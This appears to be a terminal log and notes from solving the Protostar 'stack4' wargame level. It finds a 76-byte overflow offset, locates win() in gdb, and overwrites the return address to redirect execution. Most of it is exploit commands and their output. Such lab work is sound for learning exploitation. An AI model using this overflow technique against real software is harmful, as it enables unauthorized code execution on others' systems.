#being lazy, looking for where it overflows manually
user@protostar:/opt/protostar/bin$ python -c "print 'A' * 80" | ./stack4
Segmentation fault
user@protostar:/opt/protostar/bin$ python -c "print 'A' * 75" | ./stack4
user@protostar:/opt/protostar/bin$ python -c "print 'A' * 76" | ./stack4
Segmentation fault


#overflows at 76 - 64 plus 12
gdb$ r `python -c "print 'A' * 76"`


#looked around and didn't find my A's where i'd expected them.  realized later that i could just find the win() function address and use that to overflow
gdb$ x/300xb $esp+128
0xbffff948:	0x6f	0x73	0x74	0x61	0x72	0x2f	0x62	0x69
0xbffff950:	0x6e	0x2f	0x73	0x74	0x61	0x63	0x6b	0x34
0xbffff958:	0x00	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xbffff960:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xbffff968:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xbffff970:	0x41	0x41	0x41	0x41


#changing up strategy - find win() and just overflow that address
user@protostar:/opt/protostar/bin$ gdb ./stack4
gdb$ b main
gdb$ r
gdb$ p &win
$1 = (void (*)(void)) 0x80483f4 <win>
gdb$ 

#win() is at: 0x080483f4. let's see if we can overflow in GDB
user@protostar:/opt/protostar/bin$ gdb ./stack4
gdb$ r `python -c "print '\xf4\x83\x04\x08' * 32"`


#looks good - try on command line next
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x83\x04\x08' * 32" | ./stack4
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
Segmentation fault


#cool!  let's see if we can pull back and not smash the stack so bad
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x83\x04\x08' * 24" | ./stack4
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x83\x04\x08' * 20" | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x83\x04\x08' * 19" | ./stack4
Segmentation fault
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x83\x04\x08' * 18" | ./stack4
user@protostar:/opt/protostar/bin$ 


#okay... looks like some junk is needed to overflow this more smoothly
#messed around for a while but i didn't get it to exit cleanly.  this is pretty close though
user@protostar:/opt/protostar/bin$ python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | ./stack4
code flow successfully changed
Segmentation fault
